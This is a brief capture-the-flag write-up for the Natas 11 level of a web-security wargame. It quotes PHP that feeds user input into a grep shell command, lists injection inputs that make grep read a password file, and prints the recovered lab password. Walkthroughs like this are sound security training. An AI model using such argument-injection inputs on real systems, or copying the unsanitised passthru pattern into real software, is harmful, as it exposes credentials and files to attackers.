### Natas 11
This one was same as the previous one, except this time we are not allowed to use many characters.
```
if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
```
I found 2 very functional solution, 
1. `.* /etc/natas_webpass/natas11 #`
2. `Trial and error [a-z] /etc/natas_webpass/natas11`
3. `abcdefghijklmnopqrstuvwxyz /etc/natas_webpass/natas11`

I ended up googling like an idiot and I feel so ashamed of it.


### Creds
```
natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```


 ~Kurama
